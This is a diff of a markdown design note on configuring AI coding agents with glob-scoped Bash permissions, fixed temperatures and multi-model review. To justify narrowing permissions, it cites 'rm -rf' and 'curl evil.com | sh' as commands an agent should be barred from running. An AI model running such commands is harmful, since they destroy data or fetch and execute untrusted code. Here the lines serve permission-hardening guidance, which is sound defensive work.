@@ -20,9 +20,7 @@ Per-agent frontmatter conventions that surgically scope tool access AND tune res
 
 ## Why surgical permissions beat binary allow/deny
 
-Brian's current agents use `tools: Read, Glob, Grep, Bash` and `disallowedTools: Write, Edit` — binary. But `Bash` is far too broad — a security-reviewer agent should NOT be able to run `rm -rf` or `curl evil.com | sh`, even read-only.
-
-The pvliesdonk pattern: `permission` as a structured object with glob-pattern allowlists per tool.
+Binary `tools: Read, Glob, Grep, Bash` + `disallowedTools: Write, Edit` leaves `Bash` far too broad — a security-reviewer should not run `rm -rf` or `curl evil.com | sh`. The pvliesdonk pattern: `permission` as a structured object with glob-pattern allowlists per tool.
 
 ## Pattern A: `permission.bash` per-glob allowlists
 
@@ -70,11 +68,11 @@ temperature: 0.7
 temperature: 0.1
 ```
 
-Brian's agents currently inherit default temperature (~0.7 from Sonnet, ~0.3 from Opus thinking mode). Explicitly setting it eliminates variance on verification-style agents that should produce identical findings on identical input.
+Agents currently inherit default temperature (~0.7 Sonnet, ~0.3 Opus thinking mode). Set it explicitly so verification-style agents produce identical findings on identical input.
 
 ## Pattern C: multi-model deliberation (adversarial review)
 
-For high-stakes decisions (architecture, security audit), pvliesdonk uses multiple agents from different model families to deliberate:
+High-stakes decisions (architecture, security audit) get agents from different model families deliberating:
 
 ```yaml
 ---
